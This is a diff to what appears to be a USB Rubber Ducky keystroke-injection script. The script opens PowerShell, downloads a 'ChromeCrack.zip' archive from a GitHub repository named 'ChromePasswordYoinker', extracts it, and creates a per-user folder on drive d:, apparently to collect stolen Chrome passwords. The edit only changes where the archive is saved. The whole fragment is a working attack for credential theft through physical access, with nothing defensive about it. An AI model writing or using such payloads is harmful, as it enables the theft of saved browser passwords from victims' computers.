@@ -4,10 +4,10 @@ DELAY 800
 STRING powershell
 ENTER
 DELAY 800
-STRING Invoke-WebRequest -Uri 'https://github.com/lucianchauvin/ChromePasswordYoinker/raw/master/ChromeCrack.zip' -OutFile 'C:\ChromeCracker.zip'
+STRING Invoke-WebRequest -Uri 'https://github.com/lucianchauvin/ChromePasswordYoinker/raw/master/ChromeCrack.zip' -OutFile 'C:\Users\$env:UserName\ChromeCracker.zip'
 ENTER
 DELAY 800
-STRING Expand-Archive c:\ChromeCracker.zip -DestinationPath c:\ChromeCracker -Force
+STRING Expand-Archive C:\Users\$env:UserName\ChromeCracker.zip -DestinationPath c:\ChromeCracker -Force
 ENTER
 DELAY 800
 STRING New-Item -ItemType "directory" -Name "$env:UserName" -Path "d:\" -Force
